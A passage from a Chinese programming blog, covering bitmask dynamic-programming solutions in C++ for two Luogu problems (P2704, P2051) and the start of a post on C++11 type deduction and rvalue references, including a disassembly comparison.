dp[current_row][current_row_state]+=dp[previous_row][previous_row_state];<span class="comment">//状态转移</span></span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="type">int</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=row_limit_state;i++)&#123;</span><br><span class="line">        result=(result+dp[m][i])%mod;<span class="comment">//第m行的所有状态都要考虑在内</span></span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;result&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="p2704-八炮兵"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P2704">P2704 八炮兵</a></h2>
<p>给一个P和H表示的地形地图</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/1881.png"
alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>其中只有P(Plain,平原)格子可以放炮兵,H山地不行</p>
<h3 id="状态压缩-3">状态压缩</h3>
<p>一个炮兵的打炮范围是横竖的两格相当于中象里将军腿再长一点</p>
<p>实际上和P1879棒子地很相似了,P1879种草的方格相当于放了有一个中象的将军,这个题的格子相当于放了一个壮一点的将军</p>
<p>原来一个将军顶多影响跟前的四个格子,现在一个炮可以影响8个格子,</p>
<p>不妨把跟前这四个格子叫做"一级影响",稍微远一点的四个格子叫做"二级影响",如下图示意</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221222194252888.png"
alt="image-20221222194252888" />
<figcaption aria-hidden="true">image-20221222194252888</figcaption>
</figure>
<p><strong>可见一个将军和一个炮的区别就是,将军只有一级影响,炮还有二级影响</strong></p>
<p>P1879这个题中要安排一行时,只需要考虑上一行给这一行造成的一级影响.</p>
<p>本题中除了一级影响,还要考虑二级影响,因此本题可以看作P1879的推广,</p>
<h3 id="状态转移-3">状态转移</h3>
<p>原来的状态<code>dp[current_row][current_state]</code>表示1到<code>current_row</code>行已经安排完毕,其中<code>current_state</code>是第<code>current_row</code>行的状态,也就是对<code>current_row+1</code>行的"一级影响"</p>
<p>因此拓展到有二级影响的情况,应该这样设置状态<code>dp[current_row][current_state][previous_state]</code>,意思是</p>
<p>当前已经安排好了1到<code>current_row</code>行,</p>
<p>第<code>current_row</code>行的状态是<code>current_state</code>,</p>
<p>第<code>previous_row=current_row-1</code>行的状态是<code>previous_state</code></p>
<p><code>dp[current_row][current_state][previous_state]</code>等于在前述三个条件下得到的最大炮兵数量
<span class="math display">\[
当前状态的最大炮兵数=max(枚举与当前行不冲突的上一行状态的最大炮兵数+当前行状态贡献的炮兵数)
\]</span></p>
<p>状态转移方程就是:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dp[current_row][current_state][previous_state]=<span class="built_in">max</span>(</span><br><span class="line">	dp[previous_row][previous_state][preprevious_state]+cnt_of_cannons_in_state[current_state];</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h3 id="完整代码-2">完整代码</h3>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">110</span>;<span class="comment">//最大行数</span></span><br><span class="line"><span class="type">int</span> n,m;<span class="comment">//n行,m列</span></span><br><span class="line"><span class="type">int</span> row_limit_state;<span class="comment">//一行的最大状态</span></span><br><span class="line"><span class="type">int</span> row_base_state[maxn];<span class="comment">//一行中的地形状态,row_base_state[i]为第i行的地形状态</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; row_legal_states[maxn];<span class="comment">//只看一行时,该行的所有合法摆放炮兵的状态集合,row_legal_states[i]为第i行所有可以摆放的状态</span></span><br><span class="line"><span class="type">int</span> cnt_max_cannons;<span class="comment">//记录最大炮兵数量</span></span><br><span class="line"><span class="type">int</span> dp[maxn][<span class="number">1025</span>][<span class="number">1025</span>];</span><br><span class="line"><span class="type">int</span> cnt_cannons_in_state[<span class="number">1025</span>];<span class="comment">//cnt_cannons_in_state[state]表示当一行的炮兵状态为state时,放了几个炮兵</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;<span class="comment">//n行m列</span></span><br><span class="line">    <span class="comment">// if(n)</span></span><br><span class="line">    <span class="type">int</span> single_state;<span class="comment">//输入char类型的地形转换成0或者1表示的地形</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> terrain;<span class="comment">//存放地形输入</span></span><br><span class="line"></span><br><span class="line">    row_limit_state=(<span class="number">1</span>&lt;&lt;m)<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> row_state=<span class="number">0</span>;row_state&lt;=row_limit_state;++row_state)&#123;<span class="comment">//预处理cnt_cannons_in_state数组</span></span><br><span class="line">        <span class="type">int</span> row_temp_state=row_state;</span><br><span class="line">        <span class="type">int</span> cnt_cannons=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(row_temp_state)&#123;</span><br><span class="line">            cnt_cannons+=row_temp_state&amp;<span class="number">1</span>;<span class="comment">//不停右移直到降为0,只关心最低为有没有1</span></span><br><span class="line">            row_temp_state&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt_cannons_in_state[row_state]=cnt_cannons;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> row=<span class="number">1</span>;row&lt;=n;row++)&#123;</span><br><span class="line">        <span class="type">int</span> row_state=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> col=<span class="number">1</span>;col&lt;=m;++col)&#123;</span><br><span class="line">            cin&gt;&gt;terrain;</span><br><span class="line">            <span class="keyword">if</span>(terrain==<span class="string">&#x27;P&#x27;</span>)&#123;</span><br><span class="line">                single_state=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                single_state=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            row_state=row_state*<span class="number">2</span>+single_state;</span><br><span class="line">        &#125;</span><br><span class="line">        row_base_state[row]=row_state;<span class="comment">//保存地形状态</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//立刻计算基于当前行的地形状态,可以得出的所有合法的炮兵摆放状态</span></span><br><span class="line">        <span class="keyword">for</span>(row_state=<span class="number">0</span>;row_state&lt;=row_limit_state;row_state++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(</span><br><span class="line">                (row_state&amp;(((row_state&lt;&lt;<span class="number">1</span>)|(row_state&lt;&lt;<span class="number">2</span>)|(row_state&gt;&gt;<span class="number">1</span>)|(row_state&gt;&gt;<span class="number">2</span>) )&amp;row_limit_state)   )==<span class="number">0</span><span class="comment">//这个炮兵的摆放状态不能自相冲突</span></span><br><span class="line">                &amp;&amp;</span><br><span class="line">                (row_state&amp;((~row_base_state[row])&amp;row_limit_state))==<span class="number">0</span><span class="comment">//这个炮兵的摆放状态要满足地形要求</span></span><br><span class="line">            )&#123;</span><br><span class="line">                row_legal_states[row].<span class="built_in">push_back</span>(row_state);</span><br><span class="line">                <span class="comment">// cout&lt;&lt;row_state&lt;&lt;endl;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    row_legal_states[<span class="number">0</span>].<span class="built_in">push_back</span>(<span class="number">0</span>);<span class="comment">//一定要这个初始化,第二行会查第0行的合法状态</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> current_state:row_legal_states[<span class="number">1</span>])&#123;<span class="comment">//第一行需要特殊处理,因为第一行往前看两行不存在第-1行,不能作为数组下标</span></span><br><span class="line">        dp[<span class="number">1</span>][current_state][<span class="number">0</span>]=cnt_cannons_in_state[current_state];</span><br><span class="line">        cnt_max_cannons=<span class="built_in">max</span>(cnt_max_cannons,dp[<span class="number">1</span>][current_state][<span class="number">0</span>]);<span class="comment">//一定不要忘记统计只有一行时的最大炮兵数量,测试点11专门卡这个</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> current_row=<span class="number">2</span>;current_row&lt;=n;++current_row)&#123;<span class="comment">//第二行往前看两行正好是第0行,下标访问正常</span></span><br><span class="line">        <span class="keyword">auto</span> previous_row=current_row<span class="number">-1</span>;<span class="comment">//上一行行号</span></span><br><span class="line">        <span class="keyword">auto</span> preprevious_row=previous_row<span class="number">-1</span>;<span class="comment">//上两行行号</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> current_state:row_legal_states[current_row])&#123;<span class="comment">//枚举当前行合法状态</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> previous_state:row_legal_states[previous_row])&#123;<span class="comment">//枚举上一行合法状态</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">auto</span> preprevious_state:row_legal_states[preprevious_row])&#123;<span class="comment">//枚举上两行合法状态</span></span><br><span class="line">                    <span class="keyword">if</span>(</span><br><span class="line">                        (previous_state &amp; preprevious_state)==<span class="number">0</span><span class="comment">//前两行的炮兵不能打架</span></span><br><span class="line">                        &amp;&amp;</span><br><span class="line">                        (current_state&amp;(previous_state|preprevious_state))==<span class="number">0</span><span class="comment">//本行和前两行的炮兵不能打架</span></span><br><span class="line">                    )&#123;</span><br><span class="line">                        dp[current_row][current_state][previous_state]=<span class="built_in">max</span>(<span class="comment">//状态转移方程</span></span><br><span class="line">                            dp[current_row][current_state][previous_state],</span><br><span class="line">                            dp[previous_row][previous_state][preprevious_state]+cnt_cannons_in_state[current_state]</span><br><span class="line">                        );</span><br><span class="line">                        cnt_max_cannons=<span class="built_in">max</span>(cnt_max_cannons,dp[current_row][current_state][previous_state]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// for(auto current_state:row_legal_states[n])&#123;</span></span><br><span class="line">    <span class="comment">//     cnt_max_cannons=max(cnt_max_cannons,dp[n])</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    cout&lt;&lt;cnt_max_cannons&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="p2051-八中象炮"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P2051">P2051 八中象炮</a></h2>
<p>在一个<span class="math inline">\(n\times
m\)</span>的棋盘上,任意放中象的炮,要求任意两个炮不能相互攻击,随便放炮,问最多有多少种放法</p>
<p>啥时候能炮打炮?一条水平或者竖直线上有仨个以上的炮就要打炮了</p>
<p>因此就问题转化为,<span class="math inline">\(n\times
m\)</span>个方格,每行每列可以有0或者1或者2个石头,求有多少种摆放方法</p>
<h3 id="状态压缩-4">状态压缩</h3>
<p>我最初的想法是,每行,每列都记录已经放过几个石头,然后直接深搜</p>
<p>dfs(x,y)是当前要在第x行第y列放石头,首先判断能否放石头,如果能则尝试放上石头然后下一步深搜.</p>
<p>不管能不能放石头,都要有一个直接下一步深搜</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">110</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod=<span class="number">9999973</span>;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> cnt_on_col[maxn];</span><br><span class="line"><span class="type">int</span> cnt_on_row[maxn];</span><br><span class="line"><span class="type">int</span> cnt_result=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DFS</span><span class="params">(<span class="type">int</span> y,<span class="type">int</span> x)</span></span>&#123;<span class="comment">//第y行,第x列</span></span><br><span class="line">    <span class="keyword">if</span>(y&lt;=n&amp;&amp;x&gt;m)&#123;</span><br><span class="line">        <span class="built_in">DFS</span>(y<span class="number">+1</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(y&gt;n)&#123;</span><br><span class="line">        cnt_result=(cnt_result<span class="number">+1</span>)%mod;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt_on_col[x]&lt;<span class="number">2</span>&amp;&amp;cnt_on_row[y]&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        ++cnt_on_col[x];</span><br><span class="line">        ++cnt_on_row[y];</span><br><span class="line">        <span class="built_in">DFS</span>(y,x<span class="number">+1</span>);</span><br><span class="line">        --cnt_on_col[x];</span><br><span class="line">        --cnt_on_row[y];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">DFS</span>(y,x<span class="number">+1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="built_in">DFS</span>(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">    cout&lt;&lt;cnt_result&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果就三个测试点过了,其他全都TLE</p>
<p>狗屁状压,<code>dp[i][j][k]</code>表示前i行中的列,有一个炮的列有j个,有两个炮的列有k个</p>
<p>完事</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/12/21/C++11%E7%89%B9%E6%80%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/21/C++11%E7%89%B9%E6%80%A7/" class="post-title-link" itemprop="url">C++11特性</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-12-21 22:48:00 / Modified: 22:48:58" itemprop="dateCreated datePublished" datetime="2022-12-21T22:48:00+08:00">2022-12-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="c11特性">C++11特性</h1>
<p>迈向现代的第一步</p>
<p>2011年的C++标准,叫c++11</p>
<p>使用gcc编译时,加入编译选项-std=c++11即可使用c++11特性</p>
<h2 id="类型推导">类型推导</h2>
<p>auto&amp;decltype</p>
<h3 id="auto">auto</h3>
<p><code>auto 左值=右值;</code></p>
<p>通过右值的类型推断auto代表的左值类型,必须得有右值才能用auto定义左值</p>
<p>一般用于循环时作为迭代器,比如在解释器遍历符号表时</p>
<p>在lexer.hpp中有这么一个内置符号表</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lexer.hpp</span></span><br><span class="line"><span class="type">static</span> std::vector&lt;Token&gt; build_in_token_table = &#123;</span><br><span class="line">    &#123;CONST_ID, <span class="string">&quot;PI&quot;</span>, <span class="number">3.1415926</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">    &#123;CONST_ID, <span class="string">&quot;E&quot;</span>, <span class="number">2.71828</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">	...</span><br><span class="line">    &#123;DRAW, <span class="string">&quot;DRAW&quot;</span>, <span class="number">0.0</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在lexer.cpp中有一个queryTokenTable函数,根据参数字符串查找内置符号表,如果找到相应符号返回<strong>其引用</strong></p>
<p>传统的方法是定义一个循环变量i,遍历整个符号表</p>
<p>如果使用auto则更加方便,foreach循环</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lexer.cpp</span></span><br><span class="line"><span class="type">static</span> Token* <span class="title function_">queryTokenTable</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> &amp;lexme)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;build_in_table_token:build_in_token_table)&#123;<span class="comment">//此处一定是auto &amp;,是个引用类型,否则会拷贝构造新对象</span></span><br><span class="line">        <span class="keyword">if</span>(build_in_table_token.getLexme()==lexme)&#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;build_in_table_token;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里使用的是auto
&amp;,而不是auto,之前我认为auto既然是自动的,应该可以推导出引用类型.</p>
<p>然而实际上不会,auto会忽略引用类型还有cv属性,因此这里需要手工加上引用类型</p>
<h3 id="decltype">decltype</h3>
<p>decltype关键字是用于定义同类型变量,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">decltype(a) b=<span class="number">2</span>;</span><br><span class="line">decltype(a+b) c=<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<p>decltype和auto不同的是,decltype完全拷贝其操作数的类型,包括引用和cv属性</p>
<p>对于<code>decltype(expression)</code>,这里expression如果是函数调用,则decltype与函数返回值类型相同</p>
<h2 id="右值引用">右值引用</h2>
<h3 id="右值引用-1">右值引用</h3>
<p>通常getter方法是这样定义的:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">x</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">y</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其返回值是一个右值,当调用语句结束后,返回值立刻死亡</p>
<p>实际上大多数调用约定(这里是cdecl),函数的返回值放到rax寄存器中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int x=point.x();</span><br></pre></td></tr></table></figure>
<p>该行源代码的最后的指令可能是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call point.x()</span><br><span class="line">mov [rbp+x],rax</span><br></pre></td></tr></table></figure>
<p>意味着需要在调用者栈帧中给左值int
a开4字节空间,然后将函数返回值(存在于rax寄存器)付给他</p>
<p>之后rax的任务就完成了,可以立刻用于其他计算,这就意味着函数返回值这个将亡值不复存在了</p>
<p>显然栈中是找不到这个返回值的,他只会临时存在于寄存器中</p>
<p>右值引用的作用是,在调用者栈帧中给返回值开辟一块空间,将该返回值放到这块空间中,此后在调用者中就可以引用"右值"了,实际上是引用的返回值在调用者栈帧中的拷贝,这一点可以通过反编译观察</p>
<p>比如如下程序</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> _x=<span class="number">0</span>,<span class="type">int</span> _y=<span class="number">0</span>):__x(_x),__y(_y)&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">x</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> __x;&#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">y</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> __y;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">Point <span class="title">A</span><span class="params">(<span class="number">2</span>,<span class="number">5</span>)</span></span>;</span><br><span class="line">    <span class="type">int</span> &amp;&amp;x=A.<span class="built_in">x</span>();<span class="comment">//注意此处的x是右值引用</span></span><br><span class="line">    <span class="type">int</span> y=A.<span class="built_in">y</span>();<span class="comment">//注意此处的y是普通变量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;y);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -std=c++11 main.cpp -O0 -o main </span><br></pre></td></tr></table></figure>
<p>然后用ida64反编译观察之</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+A]	</span><br><span class="line">mov     ecx, eax	;this指针</span><br><span class="line">call    __ZN5Point1xEv  ; Point::x(void)</span><br><span class="line">mov     [ebp+var_10], eax	;返回值首先拷贝给var_10</span><br><span class="line">lea     eax, [ebp+var_10]	</span><br><span class="line">mov     [ebp+x], eax		;然后拷贝给x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea     eax, [ebp+A]</span><br><span class="line">mov     ecx, eax	;this</span><br><span class="line">call    __ZN5Point1yEv  ; Point::y(void)</span><br><span class="line">mov     [ebp+y], eax	;返回值直接拷贝给y</span><br></pre></td></tr></table></figure>
<p>有一个明显区别,</p>
<p><code>int &amp;&amp;x=A.x();</code>这里貌似在调用者栈帧中产生了两个局部变量,<code>var_10</code>和<code>x</code></p>
<p>但是<code>int y=A.y();</code>只产生了一个局部变量<code>y</code></p>
<p>显然x和y两个变量是地位相等,门当户对的</p>
<p>这个<code>var_10</code>就是右值的拷贝,其存在的目的就是代理右值,使其可以进行取地址运算,实际上取得地址是<code>var_10</code>的地址</p>
<p>问题又来了,这样看,使用右值引用的时候多产生了一个局部变量,并且需要四条指令,而不使用右值引用只需要两条指令.那用了个寂寞啊,越用越慢是吧.</p>
<p>这是因为这里的调用情况是很简单的,有些复杂情况,var_10会发挥重要作用,详见<a
target="_blank" rel="noopener" href="https://blog.csdn.net/caojianfa969/article/details/118927852">右值引用</a></p>
<h3 id="完美转发">完美转发</h3>
<p>没看明白</p>
<h3 id="返回值优化">返回值优化</h3>
<p>类似于传参时是直接传递引用还是调用拷贝构造函数给形参赋值</p>
<p>返回时也面临相似的局面,比如</p>
